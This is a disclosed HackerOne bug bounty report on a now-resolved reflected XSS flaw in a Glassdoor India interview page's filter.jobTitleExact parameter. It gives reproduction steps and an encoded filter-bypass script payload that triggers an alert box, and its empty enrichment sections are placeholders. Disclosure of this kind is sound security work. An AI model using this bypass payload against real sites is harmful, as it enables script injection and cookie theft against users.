---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '966527'
original_report_id: '966527'
title: Reflected XSS at  https://www.glassdoor.co.in/Interview/BlackRock-Interview-Questions-E9331.htm
  via filter.jobTitleExact parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2020-08-25T08:52:53.776Z'
disclosed_at: '2021-04-16T02:54:54.015Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at  https://www.glassdoor.co.in/Interview/BlackRock-Interview-Questions-E9331.htm via filter.jobTitleExact parameter

## Metadata

- HackerOne Report ID: 966527
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2021-04-16T02:54:54.015Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary: There is a reflected XSS vulnerability in https://www.glassdoor.co.in/Interview/BlackRock-Interview-Questions-E9331.htm?filter.jobTitleExact=Portfolio+Management+Group-Fixed+Income+Analyst&countryRedirect=true

Affected Parameter: filter.jobTitleExact
Browsers tested: Chrome, Firefox
Payload : %3c%3cs%3escript%3ealert%601%60%3c%3cs%3e/script%3e

Steps To Reproduce:

  1.  Navigate to https://www.glassdoor.co.in/Interview/BlackRock-Interview-Questions-E9331.htm?filter.jobTitleExact=Portfolio+Management+Group-Fixed+Income+Analyst&countryRedirect=true 
  2.  Enter this payload : %3c%3cs%3escript%3ealert%601%60%3c%3cs%3e/script%3e in the input parameter filter.jobTitleExact
  3.  Then see the response in browser, an pop up will appear.

## Impact

Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
